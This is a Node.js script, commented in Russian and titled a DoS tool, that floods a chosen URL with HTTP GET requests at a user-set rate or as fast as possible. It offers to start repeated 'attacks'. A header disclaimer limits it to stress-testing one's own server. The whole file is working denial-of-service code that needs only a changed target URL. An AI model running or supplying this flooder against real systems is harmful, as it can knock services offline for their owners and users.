//////////////////////////////////////////////
// этот инструмент предназначет исключительно для проверки безопасности и защиты от ДДОС атак своего сервера 
//  при незаконном использовании вся ответсвенность лежит на вас 
// 
//
//
//
// (вы можете удалить эту часть кода)
/////////////////////////////////////////////










const http = require('http');
const url = 'http://localhost:3000'; // заменить на свой юрл 

const readline = require('readline/promises');
const { stdin: input, stdout: output } = require('process');


let timer = null;
let isAttacking = false;
let sentCount = 0;
let totalRequests = 0;

async function main() {
    const rl = readline.createInterface({ input, output });

    
    rl.on('SIGINT', () => {
        if (isAttacking) {
            stopAttack('Атака принудительно остановлена пользователем (Ctrl+C)!');
            rl.close();
            askToContinue();
        } else {
            console.log('\nВыход из программы');
            rl.close();
            process.exit(0);
        }
    });

    const totalAnswer = await rl.question('Сколько ВСЕГО запросов отправить? ');
    totalRequests = Number(totalAnswer.trim());

    const speedAnswer = await rl.question('Сколько запросов В СЕКУНДУ отправлять (0 — как можно быстрее)? ');
    const rps = Number(speedAnswer.trim());

    if (isNaN(totalRequests) || totalRequests <= 0 || isNaN(rps) || rps < 0) {
        console.log('Ошибка: введи корректные числа!\n');
        rl.close();
        return main();
    }

    sentCount = 0;
    isAttacking = true;

    function sendSingleRequest() {
        if (!isAttacking || sentCount >= totalRequests) return;

        sentCount++;
        http.get(url, (res) => {
            res.resume();
        }).on('error', () => {
            
        });
    }

    
    if (rps === 0) {
        console.log('\nКрупная атака...');
        console.log('(Для отмены нажмите Ctrl+C)');
        
        for (let i = 0; i < totalRequests; i++) {
            if (!isAttacking) break;
            sendSingleRequest();
        }
        
        stopAttack(`Все ${sentCount} запросов успешно отправлены!`);
        rl.close();
        await askToContinue();
    } 
    
   
    else {
        console.log('\nРазмеренная атака: отправляются запросы по секундам...');
        console.log('(Для отмены нажмите Ctrl+C)\n');

        timer = setInterval(async () => {
            const remaining = totalRequests - sentCount;
            const portion = Math.min(rps, remaining);

            for (let i = 0; i < portion; i++) {
                if (!isAttacking) break;
                sendSingleRequest();
            }

            console.log(`[Инфо] Отправлено: ${sentCount} из ${totalRequests}`);

            if (sentCount >= totalRequests) {
                stopAttack('Размеренная атака полностью завершена!');
                rl.close();
                await askToContinue();
            }
        }, 1000);
    }
}

function stopAttack(message) {
    isAttacking = false;
    if (timer) {
        clearInterval(timer);
        timer = null;
    }
    console.log(`\n${message}`);
    console.log(`Итог: на сервер улетело ${sentCount} запросов.\n`);
}

async function askToContinue() {
    const rl = readline.createInterface({ input, output });
    const answer = await rl.question('Хочешь запустить ЕЩЕ ОДНУ атаку? (y - да / n - выйти): ');
    rl.close();

    if (answer.trim().toLowerCase() === 'y') {
        console.log('\n--- Запуск нового раунда ---');
        main();
    } else {
        console.log('Программа закрыта. Удачи!');
        process.exit(0);
    }
}

console.log('=== ДОС-ИНСТРУМЕНТ НА NODE.JS ===');
main();
